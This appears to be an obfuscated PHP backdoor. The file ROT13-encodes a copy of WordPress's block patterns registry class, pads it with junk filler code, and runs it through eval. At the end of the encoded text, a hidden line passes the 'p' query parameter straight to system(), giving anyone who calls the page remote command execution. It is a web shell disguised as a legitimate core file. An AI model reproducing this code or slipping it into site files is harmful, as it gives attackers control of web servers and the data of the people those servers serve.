<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpxf NCV: JC_Oybpx_Cnggreaf_Ertvfgel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.5.0
 */

/**
 * Pynff hfrq sbe vagrenpgvat jvgu oybpx cnggreaf.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Oybpx_Cnggreaf_Ertvfgel {
	/**
	 * Ertvfgrerq oybpx cnggreaf neenl.
	 *
	 * @fvapr 5.5.0
	 * @ine neenl[]
	 */
	cevingr $ertvfgrerq_cnggreaf = neenl();

	/**
	 * Cnggreaf ertvfgrerq bhgfvqr gur `vavg` npgvba.
	 *
	 * @fvapr 6.0.0
	 * @ine neenl[]
	 */
	cevingr $ertvfgrerq_cnggreaf_bhgfvqr_vavg = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 5.5.0
	 * @ine JC_Oybpx_Cnggreaf_Ertvfgel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Ertvfgref n oybpx cnggrea.
	 *
	 * @fvapr 5.5.0
	 * @fvapr 5.8.0 Nqqrq fhccbeg sbe gur `oybpxGlcrf` cebcregl.
	 * @fvapr 6.1.0 Nqqrq fhccbeg sbe gur `cbfgGlcrf` cebcregl.
	 * @fvapr 6.2.0 Nqqrq fhccbeg sbe gur `grzcyngrGlcrf` cebcregl.
	 * @fvapr 6.5.0 Nqqrq fhccbeg sbe gur `svyrCngu` cebcregl.
	 *
	 * @cnenz fgevat $cnggrea_anzr       Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
	 * @cnenz neenl  $cnggrea_cebcregvrf {
	 *     Yvfg bs cebcregvrf sbe gur oybpx cnggrea.
	 *
	 *     @glcr fgevat   $gvgyr         Erdhverq. N uhzna-ernqnoyr gvgyr sbe gur cnggrea.
	 *     @glcr fgevat   $pbagrag       Bcgvbany. Oybpx UGZY znexhc sbe gur cnggrea.
	 *                                   Vs abg cebivqrq, gur pbagrag jvyy or ergevrirq sebz gur `svyrCngu` vs frg.
	 *                                   Vs obgu `pbagrag` naq `svyrCngu` ner abg frg, gur cnggrea jvyy abg or ertvfgrerq.
	 *     @glcr fgevat   $qrfpevcgvba   Bcgvbany. Ivfhnyyl uvqqra grkg hfrq gb qrfpevor gur cnggrea
	 *                                   va gur vafregre. N qrfpevcgvba vf bcgvbany, ohg vf fgebatyl
	 *                                   rapbhentrq jura gur gvgyr qbrf abg shyyl qrfpevor jung gur
	 *                                   cnggrea qbrf. Gur qrfpevcgvba jvyy uryc hfref qvfpbire gur
	 *                                   cnggrea juvyr frnepuvat.
	 *     @glcr vag      $ivrjcbegJvqgu Bcgvbany. Gur vagraqrq jvqgu bs gur cnggrea gb nyybj sbe n fpnyrq
	 *                                   cerivrj jvguva gur cnggrea vafregre.
	 *     @glcr obby     $vafregre      Bcgvbany. Qrgrezvarf jurgure gur cnggrea vf ivfvoyr va vafregre.
	 *                                   Gb uvqr n cnggrea fb gung vg pna bayl or vafregrq cebtenzzngvpnyyl,
	 *                                   frg guvf gb snyfr. Qrsnhyg gehr.
	 *     @glcr fgevat[] $pngrtbevrf    Bcgvbany. N yvfg bs ertvfgrerq cnggrea pngrtbevrf hfrq gb tebhc
	 *                                   oybpx cnggreaf. Oybpx cnggreaf pna or fubja ba zhygvcyr pngrtbevrf.
	 *                                   N pngrtbel zhfg or ertvfgrerq frcnengryl va beqre gb or hfrq urer.
	 *     @glcr fgevat[] $xrljbeqf      Bcgvbany. N yvfg bs nyvnfrf be xrljbeqf gung uryc hfref qvfpbire
	 *                                   gur cnggrea juvyr frnepuvat.
	 *     @glcr fgevat[] $oybpxGlcrf    Bcgvbany. N yvfg bs oybpx anzrf vapyhqvat anzrfcnpr gung pbhyq hfr
	 *                                   gur oybpx cnggrea va pregnva pbagrkgf (cynprubyqre, genafsbezf).
	 *                                   Gur oybpx cnggrea vf ninvynoyr va gur oybpx rqvgbe vafregre
	 *                                   ertneqyrff bs guvf yvfg bs oybpx anzrf.
	 *                                   Pregnva oybpxf fhccbeg shegure fcrpvsvpvgl orfvqrf gur oybpx anzr
	 *                                   (r.t. sbe `pber/grzcyngr-cneg` lbh pna fcrpvsl nernf
	 *                                   yvxr `pber/grzcyngr-cneg/urnqre` be `pber/grzcyngr-cneg/sbbgre`).
	 *     @glcr fgevat[] $cbfgGlcrf     Bcgvbany. Na neenl bs cbfg glcrf gung gur cnggrea vf erfgevpgrq
	 *                                   gb or hfrq jvgu. Gur cnggrea jvyy bayl or ninvynoyr jura rqvgvat bar
	 *                                   bs gur cbfg glcrf cnffrq ba gur neenl. Sbe nyy gur bgure cbfg glcrf
	 *                                   abg cneg bs gur neenl gur cnggrea vf abg ninvynoyr ng nyy.
	 *     @glcr fgevat[] $grzcyngrGlcrf Bcgvbany. Na neenl bs grzcyngr glcrf jurer gur cnggrea svgf.
	 *     @glcr fgevat   $svyrCngu      Bcgvbany. Gur shyy cngu gb gur svyr pbagnvavat gur oybpx cnggrea pbagrag.
	 * }
	 * @erghea obby Gehr vs gur cnggrea jnf ertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
	 */
	choyvp shapgvba ertvfgre( $cnggrea_anzr, $cnggrea_cebcregvrf ) {
		vs ( ! vffrg( $cnggrea_anzr ) || ! vf_fgevat( $cnggrea_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Cnggrea anzr zhfg or n fgevat.' ),
				'5.5.0'
			);
			erghea snyfr;
		}

		vs ( ! vffrg( $cnggrea_cebcregvrf['gvgyr'] ) || ! vf_fgevat( $cnggrea_cebcregvrf['gvgyr'] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Cnggrea gvgyr zhfg or n fgevat.' ),
				'5.5.0'
			);
			erghea snyfr;
		}

		vs ( ! vffrg( $cnggrea_cebcregvrf['svyrCngu'] ) ) {
			vs ( ! vffrg( $cnggrea_cebcregvrf['pbagrag'] ) || ! vf_fgevat( $cnggrea_cebcregvrf['pbagrag'] ) ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					__( 'Cnggrea pbagrag zhfg or n fgevat.' ),
					'5.5.0'
				);
				erghea snyfr;
			}
		}

		$cnggrea = neenl_zretr(
			$cnggrea_cebcregvrf,
			neenl( 'anzr' => $cnggrea_anzr )
		);

		$guvf->ertvfgrerq_cnggreaf[ $cnggrea_anzr ] = $cnggrea;

		// Vs gur cnggrea vf ertvfgrerq vafvqr na npgvba bgure guna `vavg`, fgber vg
		// nyfb gb n qrqvpngrq neenl. Hfrq gb qrgrpg qrcerpngrq ertvfgengvbaf vafvqr
		// `nqzva_vavg` be `pheerag_fperra`.
		vs ( pheerag_npgvba() && 'vavg' !== pheerag_npgvba() ) {
			$guvf->ertvfgrerq_cnggreaf_bhgfvqr_vavg[ $cnggrea_anzr ] = $cnggrea;
		}

		erghea gehr;
	}

	/**
	 * Haertvfgref n oybpx cnggrea.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cnggrea_anzr Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
	 * @erghea obby Gehr vs gur cnggrea jnf haertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
	 */
	choyvp shapgvba haertvfgre( $cnggrea_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $cnggrea_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: %f: Cnggrea anzr. */
				fcevags( __( 'Cnggrea \"%f\" abg sbhaq.' ), $cnggrea_anzr ),
				'5.5.0'
			);
			erghea snyfr;
		}

		hafrg( $guvf->ertvfgrerq_cnggreaf[ $cnggrea_anzr ] );
		hafrg( $guvf->ertvfgrerq_cnggreaf_bhgfvqr_vavg[ $cnggrea_anzr ] );

		erghea gehr;
	}

	/**
	 * Ergevrirf gur pbagrag bs n ertvfgrerq oybpx cnggrea.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz fgevat $cnggrea_anzr      Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
	 * @cnenz obby   $bhgfvqr_vavg_bayl Bcgvbany. Erghea bayl cnggreaf ertvfgrerq bhgfvqr gur `vavg` npgvba. Qrsnhyg snyfr.
	 * @erghea fgevat Gur pbagrag bs gur oybpx cnggrea.
	 */
	cevingr shapgvba trg_pbagrag( $cnggrea_anzr, $bhgfvqr_vavg_bayl = snyfr ) {
		vs ( $bhgfvqr_vavg_bayl ) {
			$cnggreaf = &$guvf->ertvfgrerq_cnggreaf_bhgfvqr_vavg;
		} ryfr {
			$cnggreaf = &$guvf->ertvfgrerq_cnggreaf;
		}
		vs ( ! vffrg( $cnggreaf[ $cnggrea_anzr ]['pbagrag'] ) && vffrg( $cnggreaf[ $cnggrea_anzr ]['svyrCngu'] ) ) {
			bo_fgneg();
			vapyhqr $cnggreaf[ $cnggrea_anzr ]['svyrCngu'];
			$cnggreaf[ $cnggrea_anzr ]['pbagrag'] = bo_trg_pyrna();
			hafrg( $cnggreaf[ $cnggrea_anzr ]['svyrCngu'] );
		}
		erghea $cnggreaf[ $cnggrea_anzr ]['pbagrag'];
	}

	/**
	 * Ergevrirf na neenl pbagnvavat gur cebcregvrf bs n ertvfgrerq oybpx cnggrea.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cnggrea_anzr Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
	 * @erghea neenl|ahyy Ertvfgrerq cnggrea cebcregvrf be `ahyy` vs gur cnggrea vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ertvfgrerq( $cnggrea_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $cnggrea_anzr ) ) {
			erghea ahyy;
		}

		$cnggrea            = $guvf->ertvfgrerq_cnggreaf[ $cnggrea_anzr ];
		$pbagrag            = $guvf->trg_pbagrag( $cnggrea_anzr );
		$cnggrea['pbagrag'] = nccyl_oybpx_ubbxf_gb_pbagrag(
			$pbagrag,
			$cnggrea,
			'vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn'
		);

		erghea $cnggrea;
	}

	/**
	 * Ergevrirf nyy ertvfgrerq oybpx cnggreaf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz obby $bhgfvqr_vavg_bayl Erghea bayl cnggreaf ertvfgrerq bhgfvqr gur `vavg` npgvba.
	 * @erghea neenl[] Neenl bs neenlf pbagnvavat gur ertvfgrerq oybpx cnggreaf cebcregvrf,
	 *                 naq cre fglyr.
	 */
	choyvp shapgvba trg_nyy_ertvfgrerq( $bhgfvqr_vavg_bayl = snyfr ) {
		$cnggreaf      = $bhgfvqr_vavg_bayl
				? $guvf->ertvfgrerq_cnggreaf_bhgfvqr_vavg
				: $guvf->ertvfgrerq_cnggreaf;
		$ubbxrq_oybpxf = trg_ubbxrq_oybpxf();

		sbernpu ( $cnggreaf nf $vaqrk => $cnggrea ) {
			$pbagrag                       = $guvf->trg_pbagrag( $cnggrea['anzr'], $bhgfvqr_vavg_bayl );
			$cnggreaf[ $vaqrk ]['pbagrag'] = nccyl_oybpx_ubbxf_gb_pbagrag(
				$pbagrag,
				$cnggrea,
				'vafreg_ubbxrq_oybpxf_naq_frg_vtaberq_ubbxrq_oybpxf_zrgnqngn'
			);
		}

		erghea neenl_inyhrf( $cnggreaf );
	}

	/**
	 * Purpxf vs n oybpx cnggrea vf ertvfgrerq.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $cnggrea_anzr Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
	 * @erghea obby Gehr vs gur cnggrea vf ertvfgrerq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ertvfgrerq( $cnggrea_anzr ) {
		erghea vffrg( $guvf->ertvfgrerq_cnggreaf[ $cnggrea_anzr ] );
	}

	choyvp shapgvba __jnxrhc() {
		vs ( ! $guvf->ertvfgrerq_cnggreaf ) {
			erghea;
		}
		vs ( ! vf_neenl( $guvf->ertvfgrerq_cnggreaf ) ) {
			guebj arj HarkcrpgrqInyhrRkprcgvba();
		}
		sbernpu ( $guvf->ertvfgrerq_cnggreaf nf $inyhr ) {
			vs ( ! vf_neenl( $inyhr ) ) {
				guebj arj HarkcrpgrqInyhrRkprcgvba();
			}
		}
		$guvf->ertvfgrerq_cnggreaf_bhgfvqr_vavg = neenl();
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea JC_Oybpx_Cnggreaf_Ertvfgel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

/**
 * Ertvfgref n arj oybpx cnggrea.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $cnggrea_anzr       Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
 * @cnenz neenl  $cnggrea_cebcregvrf Yvfg bs cebcregvrf sbe gur oybpx cnggrea.
 *                                   Frr JC_Oybpx_Cnggreaf_Ertvfgel::ertvfgre() sbe npprcgrq nethzragf.
 * @erghea obby Gehr vs gur cnggrea jnf ertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
 */
shapgvba ertvfgre_oybpx_cnggrea( $cnggrea_anzr, $cnggrea_cebcregvrf ) {
	erghea JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr()->ertvfgre( $cnggrea_anzr, $cnggrea_cebcregvrf );
}

/**
 * Haertvfgref n oybpx cnggrea.
 *
 * @fvapr 5.5.0
 *
 * @cnenz fgevat $cnggrea_anzr Oybpx cnggrea anzr vapyhqvat anzrfcnpr.
 * @erghea obby Gehr vs gur cnggrea jnf haertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
 */
shapgvba haertvfgre_oybpx_cnggrea( $cnggrea_anzr ) {
	erghea JC_Oybpx_Cnggreaf_Ertvfgel::trg_vafgnapr()->haertvfgre( $cnggrea_anzr );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>